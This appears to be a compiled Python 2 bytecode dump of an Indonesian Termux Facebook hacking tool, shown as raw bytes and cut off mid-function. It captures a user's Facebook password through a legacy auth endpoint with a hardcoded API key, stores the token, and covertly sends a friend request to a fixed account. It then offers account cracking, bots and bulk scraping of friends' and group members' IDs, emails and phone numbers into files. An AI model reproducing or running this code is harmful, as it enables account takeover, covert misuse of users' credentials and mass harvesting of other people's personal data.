ó
ß_c           @   s=  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z y d  d l Z Wn e k
 rÐ e  j d  n Xy d  d l Z Wn e k
 re  j d  n Xd  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d dL g e _ d   Z d   Z d   Z  d   Z! d Z" d   Z# d a$ g  Z% g  a& g  a' g  a( g  a) g  Z* g  Z+ g  Z, g  Z- g  Z. g  Z/ g  Z0 g  Z1 g  Z2 g  Z3 g  Z4 g  Z5 g  Z6 g  Z7 g  Z8 d Z9 d Z: d   Z; d   Z< d   Z= d   Z> d   Z? d   Z@ d   ZA d   ZB d   ZC d   ZD d   ZE d   ZF d    ZG d!   ZH d"   ZI d#   ZJ d$   ZK d%   ZL d&   ZM d'   ZN d(   ZO d)   ZP d*   ZQ d+   ZR d,   ZS d-   ZT d.   ZU d/   ZV d0   ZW d1   ZX d2   ZY d3   ZZ d4   Z[ d5   Z\ d6   Z] d7   Z^ d8   Z_ d9   Z` d:   Za d;   Zb d<   Zc d=   Zd d>   Ze d?   Zf d@   Zg dA   Zh dB   Zi dC   Zj dD   Zk dE   Zl dF   Zm dG   Zn dH   Zo dI   Zp dJ   Zq er dK  Zs e;   d S(M   iÿÿÿÿN(   t
   ThreadPoolt    (   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c         C   sS   d } d } x: |  D]2 } | d | t  j d t |  d  | 7} q Wt |  S(   Nt   mhkbpcPR   t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   /sdcard/hal.pyt   acak   s
    0c         C   s~   d } xA | D]9 } | j  |  } |  j d | d t d |   }  q W|  d 7}  |  j d d  }  t j j |  d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strt   syst   stdoutt   write(   R   R   R   t   j(    (    s   /sdcard/hal.pyR   %   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/hal.pyt   jalan/   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gáz?(   R   R   R   R   R   R   (   R   R   (    (    s   /sdcard/hal.pyt   jalan_15   s    sW            [92m             .----------. 
                     [92m /            \ 
                   [92m  |              |  
                     [92m|, [31m .-.  .-.  [92m,| 
                    [92m | )[31m(__/  \__)[92m( | 
                   [92m  |/    [31m /\  [92m  \ | 
                   [92m  (_     [31m^^  [92m   _) 
                    [92m  \__[31m|IIIIII|[92m__/
                      [92m |[31m-\IIIIII/-[92m| 
                     [92m  \          / 
                        [92m --------

		[92m{[31m---[92m} [95mAuthor:KingTebe [92m{[31m---[92m}
		[92m{[31m---[92m} [95mYoutub:BLACK-IT [92m{[31m---[92m}

[92m[[31mâ[92m] [92mWarning [31m: [92mAgar Akun Tidak Kena CP Buatlah Akun Baru Dulu
[92m[[31mâ[92m] [92mWarning [31m: [92mLogin Dulu Di Browser Kalian, Sebelum Login Di Termuxc          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s$   [1;91m[â] [1;92mLoading [1;97mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/hal.pyt   tikO   s
      i    s   [31mNot Vulns	   [32mVulnc           C   s   t  j d  t   d  S(   Nt   reset(   t   ost   systemt   masuk(    (    (    s   /sdcard/hal.pyt   lisensin   s    c          C   s©   t  j d  t GHd GHt d  t d  d GHt d  }  |  d k rW d GHt   nN |  d k rm t   n8 |  d k r t   n" |  d	 k r t   n d GHt   d  S(
   NR"   R   s.   [1;91m> [1;95m1.[1;96m LOGINN WITH FACEBOOKs*   [1;91m> [1;95m2.[1;96m LOGIN WITH TOKENs   [31m> [96mPilih Cuy: [91ms   [1;91m[!] Wrong inputt   1t   2t   0(   R#   R$   t   logoR   t	   raw_inputt   keluart   logint   tokenz(   t   msuk(    (    s   /sdcard/hal.pyR%   s   s$    





c          C   sË  t  j d  y t d d  }  t   Wnt t f k
 rÆt  j d  t GHd GHt d  t d  } t	 j	 d  } t
   y t j d  Wn  t j k
 r³ d	 GHt   n Xt t j _ t j d
 d  | t j d <| t j d <t j   t j   } d | k rcy.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d  6d! d" 6} t j d#  } | j |  | j   } | j i | d$ 6 d% } t j | d& | } t j | j  }	 t d d'  }
 |
 j |	 d(  |
 j    d) GHt j! d* |	 d(  t  j d+  t   Wqct j" j# k
 r_d	 GHt   qcXn  d, | k rd- GHd. GHt  j d/  t$ j% d0  t   qÇd1 GHt  j d/  t$ j% d0  t&   n Xd  S(2   NR"   s	   login.txtt   rR   s4   [1;96m[â] [1;92mLOGIN AKUN FACEBOOK [1;91m[â]s@   [1;91m[+] [1;36mID[1;97m/[1;96mEmail[1;97m [1;91m:[1;92m s+   [1;91m[+] [1;36mPassword [1;91m:[1;92m s   https://m.facebook.coms   
[1;91m[!] No connectiont   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR'   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR)   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens5   
[1;91m[[1;96mâ[1;91m] [1;92mLogin successfullysM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s(   xdg-open https://github.com/CrazyLolz100t
   checkpoints%   
[1;91m[!] [1;93mAccount Checkpoints   
[1;92m[#] Harap Login Ulang !s   rm -rf login.txti   s   
[1;91m[!] Login Failed('   R#   R$   t   opent   menut   KeyErrort   IOErrorR*   R   R+   t   getpassR!   t   brt	   mechanizet   URLErrorR,   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R   R   R-   (   t   tokett   idt   pwdt   urlRB   t   dataR   t   aR0   R   t   zedd(    (    s   /sdcard/hal.pyR-      sl    

S

c          C   sß   t  j d  t GHd GHt d  }  y` t j d |   } t j | j  } | d } t	 d d  } | j
 |   | j   t   WnU t k
 rÚ d GHt d	  } | d k rº t   qÛ | d
 k rÐ t   qÛ t   n Xd  S(   NR"   R   s(   [1;91m[?] [1;92mToken[1;91m : [1;97ms+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s   [1;91m[!] Wrongs6   [1;91m[?] [1;92mWant to pick up token?[1;97m[y/n]: t   y(   R#   R$   R*   R+   RY   RZ   R[   R\   R]   RF   R   R^   RG   RH   R,   R-   (   Ra   t   otwRf   t   namaRg   R   (    (    s   /sdcard/hal.pyR.   Ä   s(    



c          C   s¹  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xy= t j	 d |   } t
 j | j  } | d } | d	 } Wnf t k
 rð t  j d  d
 GHt  j d  t j d  t   n# t j j k
 rd GHt   n Xt GHd GHt d | d  t d |  t d d d  t d  t d  t d  t d  t d  t d  t d  t d  t d  d GHt   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=Rh   Rb   s$   [1;91m[!] [1;93mAccount Checkpoints   [1;91m[!] No connectionR   s7   [1;91m[[1;96mâ[1;91m][1;97m Name [1;91m: [1;92ms   [1;97ms7   [1;91m[[1;96mâ[1;91m][1;97m ID   [1;91m: [1;92ms
   [1;97mâi(   s   âs*   [1;91m> [1;93m1.[1;95m User informations+   [1;91m> [1;93m2.[1;95m Crack Id/email/hps?   [1;91m> [1;93m3.[1;95m Crack facebook account               s$   [1;91m> [1;93m4.[1;95m Bot       s+   [1;91m> [1;93m5.[1;95m Others           s/   [1;91m> [1;93m6.[1;95m Show token           s0   [1;91m> [1;93m7.[1;95m Delete trash          s-   [1;91m> [1;93m8.[1;95m  LogOut            s1   [1;91m> [1;93m0.[1;95m Exit programs          s   â(   R#   R$   RF   t   readRI   R   R   R-   RY   RZ   R[   R\   R]   RH   R`   R   R,   R*   R   t   pilih(   Ra   Rj   Rf   Rk   Rb   (    (    s   /sdcard/hal.pyRG   Ü   sN    










c          C   sW  t  d  }  |  d k r' d GHt   n,|  d k r= t   n|  d k rS t   n |  d k ri t   nê |  d k r t   nÔ |  d k r t   n¾ |  d	 k rå t j d
  t	 GHt
 d d  j   } d | GHt  d  t   nn |  d k rt j d  nR |  d k r1t j d  t j d  t   n" |  d k rGt   n d GHt   d  S(   Ns    [1;97m[1;91mPilih Cuy: [1;97mR   s   [1;91m[!] Wrong inputR'   R(   t   3t   4t   5t   6R"   s	   login.txtR0   s-   [1;91m[+] [1;92mYour token[1;91m :[1;97m s   
[1;91m[ [1;97mBack [1;91m]t   7t   outt   8s   rm -rf login.txtR)   (   R+   Rm   t	   informasit   dumpt	   menu_hackt   menu_bott   lainR#   R$   R*   RF   Rl   RG   t   removeR,   (   Rg   Ra   (    (    s   /sdcard/hal.pyRm     s>    





	



c          C   sª  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } t
 d  t j d	 |   } t j | j  } xö| d
 D]Ô} | | d k sÞ | | d k r¸ t j d | d d |   } t j | j  } d d GHy d | d GHWn t k
 rAd GHn Xy d | d GHWn t k
 rkd GHn Xy d | d GHWn t k
 rd GHn Xy d | d GHWn t k
 r¿d GHn Xy d | d d GHWn t k
 ríd GHn Xy d | d GHWn t k
 rd  GHn XyL d! GHx@ | d" D]4 } y d# | d$ d GHWq+t k
 r^d% GHq+Xq+WWn t k
 rwn Xt	 d&  t   q¸ q¸ Wd' GHt	 d&  t   d  S((   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s>   [1;91m[+] [1;92mEnter ID[1;97m/[1;92mName[1;91m : [1;97ms,   [1;91m[âº] [1;92mWait a minute [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Re   Rh   Rb   s   https://graph.facebook.com/s   ?access_token=i*   s
   [1;97mâs+   [1;91m[â¹] [1;92mName[1;97m          : s9   [1;91m[?] [1;92mName[1;97m          : [1;91mNot founds+   [1;91m[â¹] [1;92mID[1;97m            : s9   [1;91m[?] [1;92mID[1;97m            : [1;91mNot founds+   [1;91m[â¹] [1;92mEmail[1;97m         : R2   s9   [1;91m[?] [1;92mEmail[1;97m         : [1;91mNot founds+   [1;91m[â¹] [1;92mTelephone[1;97m     : t   mobile_phones9   [1;91m[?] [1;92mTelephone[1;97m     : [1;91mNot founds+   [1;91m[â¹] [1;92mLocation[1;97m      : t   locations9   [1;91m[?] [1;92mLocation[1;97m      : [1;91mNot founds+   [1;91m[â¹] [1;92mDate of birth[1;97m : t   birthdays9   [1;91m[?] [1;92mDate of birth[1;97m : [1;91mNot founds+   [1;91m[â¹] [1;92mSchool[1;97m        : t	   educations#   [1;91m                   ~ [1;97mt   schools,   [1;91m                   ~ [1;91mNot founds   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[â] User not found(   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   R   RY   RZ   R[   R\   R]   RH   RG   (   Ra   t   aidR0   t   cokR   R   R   t   q(    (    s   /sdcard/hal.pyRu   (  st    
 	 	 	 	 	 	 	  


c          C   s¾   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHd GHd GHd GHt	   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   R   s3   [1;97mâ--[1;91m> [1;92m1.[1;97m Get ID friends?   [1;97mâ--[1;91m> [1;92m2.[1;97m Get ID friend from friends3   [1;97mâ--[1;91m> [1;92m3.[1;97m Get ID Searchs9   [1;97mâ--[1;91m> [1;92m4.[1;97m Get group member IDs<   [1;97mâ--[1;91m> [1;92m5.[1;97m Get group member emailsC   [1;97mâ--[1;91m> [1;92m6.[1;97m Get group member phone numbers6   [1;97mâ--[1;91m> [1;92m7.[1;97m Get email friendsB   [1;97mâ--[1;91m> [1;92m8.[1;97m Get email friend from friendsA   [1;97mâ--[1;91m> [1;92m9.[1;97m Get a friend's phone numbersN   [1;97mâ--[1;91m> [1;92m10.[1;97m Get a friend's phone number from friends*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R#   R$   RF   Rl   RI   R   R   R-   R*   t
   dump_pilih(   Ra   (    (    s   /sdcard/hal.pyRv   _  s0    c          C   s;  t  d  }  |  d k r' d GHt   n|  d k r= t   nú |  d k rS t   nä |  d k r{ t j d  d GHt   n¼ |  d	 k r t   n¦ |  d
 k r§ t   n |  d k r½ t	   nz |  d k rÓ t
   nd |  d k ré t   nN |  d k rÿ t   n8 |  d k rt   n" |  d k r+t   n d GHt   d  S(   Ns   [1;97mââ[1;91mD [1;97mR   s   [1;91m[!] Wrong inputR'   R(   Rn   R"   s   [1;91mSegeraRo   Rp   Rq   Rr   Rt   t   9t   10R)   (   R+   R   t   id_temant   idfrom_temanR#   R$   R,   t   id_member_grupt   em_member_grupt   no_member_grupR2   t   emailfrom_temant   nomor_hpt   hpfrom_temanRG   (   t   cuih(    (    s   /sdcard/hal.pyR   y  s<    











c          C   sQ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xy*t  j d  t
 GHt j d |   } t j | j  } t d	  d
 d GHt d d  } xr | d D]f } t j | d  | j | d d  d t t t   d | d Gt j j   t j d  qì W| j   d GHd t t  GHt d  } t  j d d |  d | GHt d  t   Wn t k
 rØd GHt d  t   nu t t f k
 rd GHt d  t   nI t k
 r*d GHt d  t   n# t j  j! k
 rLd GHt"   n Xd  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   s3   https://graph.facebook.com/me/friends?access_token=s0   [1;91m[âº] [1;92mGet all friend id [1;97m...i*   s
   [1;97mâs   out/id_teman.txtR   Re   Rb   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97mg-Cëâ6?sB   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get id [1;97m....s.   [1;91m[+] [1;92mTotal ID [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R#   R$   RF   Rl   RI   R   R   R-   t   mkdirt   OSErrorR*   RY   RZ   R[   R\   R]   R   t   idtemant   appendR   R   R
   R   R   R   R^   R+   t   renameRv   t   KeyboardInterruptt   EOFErrorRH   R`   R   R,   (   Ra   R0   R   t   bzRf   t   done(    (    s   /sdcard/hal.pyR     sb    
	   
	






c    	      C   sÑ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xyªt  j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt j d	 | d |   } t j | j  } t d  d d GHt d d  } xv | d d D]f } t j | d  | j | d d  d t t t   d | d Gt j j   t j d  qlW| j   d GHd t t  GHt d  } t  j d d |  d  | GHt d  t   Wn t k
 rXd! GHt d  t   nu t t f k
 rd" GHt d  t   nI t k
 rªd# GHt d  t   n# t j  j! k
 rÌd$ GHt"   n Xd  S(%   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rh   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s)   ?fields=friends.limit(5000)&access_token=s<   [1;91m[âº] [1;92mGet all friend id from friend [1;97m...i*   s
   [1;97mâs   out/id_teman_from_teman.txtR   t   friendsRe   Rb   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97mg-Cëâ6?sB   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get id [1;97m....s.   [1;91m[+] [1;92mTotal ID [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R#   R$   RF   Rl   RI   R   R   R-   R   R   R*   R+   RY   RZ   R[   R\   R]   RH   Rv   R   t   idfromtemanR   R   R   R
   R   R   R   R^   R   R   R   R`   R   R,   (	   Ra   t   idtt   jokt   opR0   R   R   Rf   R   (    (    s   /sdcard/hal.pyR   Í  st    

	   
	






c    	      C   sÀ  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xy t j d  Wn t	 k
 rw n Xy¦t j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 r d GHt d  t   n Xt d  d d GHt  d d  } t j d | d |   } t j | j  } xr | d D]f } t j | d  | j | d d  d t t t   d | d Gt j j   t j d  q[W| j   d GHd t t  GHt d  } t j d d |  d  | GHt d  t   Wn t k
 rGd! GHt d  t   nu t t f k
 rsd" GHt d  t   nI t k
 rd# GHt d  t   n# t j  j! k
 r»d$ GHt"   n Xd  S(%   Ns	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   R"   s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rh   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s2   [1;91m[âº] [1;92mGet group member id [1;97m...i*   s
   [1;97mâs   out/member_grup.txtR   s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=Re   Rb   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97mg-Cëâ6?sB   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get id [1;97m....s.   [1;91m[+] [1;92mTotal ID [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   RF   Rl   RI   R#   R$   R   R   R-   R   R   R*   R+   RY   RZ   R[   R\   R]   RH   Rv   R   t   idmemR   R   R   R
   R   R   R   R^   R   R   R   R`   R   R,   (	   Ra   Rb   R0   t   aswR   t   ret   sRf   R   (    (    s   /sdcard/hal.pyR     sr    

	   
	






c          C   s"  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xy t j d  Wn t	 k
 rw n Xyt j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 r d GHt d  t   n Xt d  d d GHt  d d  } t j d | d |   } t j | j  } xË | d D]¿ } t j d | d d |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wq[t k
 rq[Xq[W| j   d d GHd GHd  t t  GHt d!  }
 t j d d" |
  d# |
 GHt d  t   Wn t k
 r©d$ GHt d  t   nu t t f k
 rÕd% GHt d  t   nI t k
 rûd& GHt d  t   n# t j  j! k
 rd' GHt"   n Xd  S((   Ns	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   R"   s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rh   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s5   [1;91m[âº] [1;92mGet group member email [1;97m...i*   s
   [1;97mâs   out/em_member_grup.txtR   s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=Re   Rb   s   ?access_token=R2   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | g-Cëâ6?sW   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get email from member group [1;97m....s1   [1;91m[+] [1;92mTotal Email [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   RF   Rl   RI   R#   R$   R   R   R-   R   R   R*   R+   RY   RZ   R[   R\   R]   RH   Rv   R   t   emmemR   R   R   R
   R   R   R   R^   R   R   R   R`   R   R,   (   Ra   Rb   R0   R   R   R   R    Rf   R   R   R   (    (    s   /sdcard/hal.pyR   B  s~    

	0  
		






c          C   s"  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xy t j d  Wn t	 k
 rw n Xyt j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 r d GHt d  t   n Xt d  d d GHt  d d  } t j d | d |   } t j | j  } xË | d D]¿ } t j d | d d |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wq[t k
 rq[Xq[W| j   d d GHd GHd  t t  GHt d!  }
 t j d d" |
  d# |
 GHt d  t   Wn t k
 r©d$ GHt d  t   nu t t f k
 rÕd% GHt d  t   nI t k
 rûd& GHt d  t   n# t j  j! k
 rd' GHt"   n Xd  S((   Ns	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   R"   s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rh   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s<   [1;91m[âº] [1;92mGet group member phone number [1;97m...i*   s
   [1;97mâs   out/no_member_grup.txtR   s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=Re   Rb   s   ?access_token=R{   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | g-Cëâ6?s^   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get phone number from member group [1;97m....s2   [1;91m[+] [1;92mTotal Number [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   RF   Rl   RI   R#   R$   R   R   R-   R   R   R*   R+   RY   RZ   R[   R\   R]   RH   Rv   R   t   nomemR   R   R   R
   R   R   R   R^   R   R   R   R`   R   R,   (   Ra   Rb   R0   R   R   R   R    Rf   R   R   R   (    (    s   /sdcard/hal.pyR     s~    

	0  
		






c          C   s¦  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xy t j d  Wn t	 k
 rw n Xyt j d  t
 GHt j d |   } t j | j  } t d	  d
 d GHt  d d  } xË | d D]¿ } t j d | d d |   } t j | j  } yt t j | d  | j | d d  d t t t   d | d d | d d Gt j j   t j d  Wqß t k
 rqß Xqß W| j   d
 d GHd GHd t t  GHt d  } t j d d |  d | GHt d  t   Wn t k
 r-d GHt d  t   nu t t f k
 rYd  GHt d  t   nI t k
 rd! GHt d  t   n# t j  j! k
 r¡d" GHt"   n Xd  S(#   Ns	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   R"   s3   https://graph.facebook.com/me/friends?access_token=s3   [1;91m[âº] [1;92mGet all friend email [1;97m...i*   s
   [1;97mâs   out/email_teman.txtR   Re   s   https://graph.facebook.com/Rb   s   ?access_token=R2   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | Rh   g-Cëâ6?sE   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get email [1;97m....s1   [1;91m[+] [1;92mTotal Email [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   RF   Rl   RI   R#   R$   R   R   R-   R   R   R*   RY   RZ   R[   R\   R]   R   t   emR   R   R   R
   R   R   R   RH   R^   R+   R   Rv   R   R   R`   R   R,   (   Ra   R0   Rf   R   R   R   R   R   (    (    s   /sdcard/hal.pyR2   Â  sl    
	0  
		






c          C   s/  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xyt  j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt j d	 | d |   } t j | j  } t d  d d GHt d d  } xË | d D]¿ } t j d	 | d d
 |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wqht k
 r&qhXqhW| j   d d GHd GHd t t  GHt d  }
 t  j d d  |
  d! |
 GHt d  t   Wn t k
 r¶d" GHt d  t   nu t t f k
 râd# GHt d  t   nI t k
 rd$ GHt d  t   n# t j  j! k
 r*d% GHt"   n Xd  S(&   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rh   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s   /friends?access_token=s?   [1;91m[âº] [1;92mGet all friend email from friend [1;97m...i*   s
   [1;97mâs   out/em_teman_from_teman.txtR   Re   Rb   R2   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | g-Cëâ6?sE   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get email [1;97m....s1   [1;91m[+] [1;92mTotal Email [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R#   R$   RF   Rl   RI   R   R   R-   R   R   R*   R+   RY   RZ   R[   R\   R]   RH   Rv   R   t   emfromtemanR   R   R   R
   R   R   R   R^   R   R   R   R`   R   R,   (   Ra   R   R   R   R0   Rf   R   R   R   R   R   (    (    s   /sdcard/hal.pyR   ù  s    

	0  
		






c          C   s¹  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xyt  j d  t
 GHt d  d	 d
 GHd |  } t j |  } t j | j  } t d d  } xË | d D]¿ } t j d | d d |   } t j | j  } yt t j | d  | j | d d  d t t t   d | d d | d d Gt j j   t j d  Wqò t k
 r°qò Xqò W| j   d	 d
 GHd GHd t t  GHt d  } t  j d d |  d | GHt d  t   Wn t k
 r@d GHt d  t   nu t t f k
 rld  GHt d  t   nI t k
 rd! GHt d  t   n# t j  j! k
 r´d" GHt"   n Xd  S(#   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   s:   [1;91m[âº] [1;92mGet all friend number phone [1;97m...i*   s
   [1;97mâs3   https://graph.facebook.com/me/friends?access_token=s   out/nomer_teman.txtR   Re   s   https://graph.facebook.com/Rb   s   ?access_token=R{   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | Rh   g-Cëâ6?sF   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get number [1;97m....s2   [1;91m[+] [1;92mTotal Number [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R#   R$   RF   Rl   RI   R   R   R-   R   R   R*   R   RY   RZ   R[   R\   R]   t   hpR   R   R   R
   R   R   R   RH   R^   R+   R   Rv   R   R   R`   R   R,   (   Ra   Rd   R0   R   R   t   nR   R   (    (    s   /sdcard/hal.pyR   :  sp    
	
0  
		






c          C   s/  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xyt  j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt j d	 | d |   } t j | j  } t d  d d GHt d d  } xË | d D]¿ } t j d	 | d d
 |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wqht k
